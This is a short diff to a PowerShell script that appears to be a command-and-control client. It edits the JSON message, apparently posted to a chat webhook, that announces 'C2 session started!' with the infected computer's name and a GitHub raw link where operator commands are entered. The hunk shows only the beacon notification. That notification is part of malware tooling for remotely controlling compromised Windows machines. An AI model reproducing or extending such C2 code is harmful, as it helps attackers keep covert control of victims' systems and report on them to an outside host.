@@ -84,11 +84,12 @@ $previouscmd = $response
 $noraw = $ghurl -replace "/raw", ""
 $timestamp = Get-Date -Format "dd/MM/yyyy  @  HH:mm"
 $jsonPayload = @{
+    content    = "C2 client connecting.."
     tts        = $false
     embeds     = @(
         @{
             title       = "$env:COMPUTERNAME | C2 session started!"
-            description = ":link: ``Enter Commands Here`` - $noraw :link:"
+            description = "Enter Commands Here - $noraw"
             color       = 16711680
             author      = @{
                 name     = "egieb"
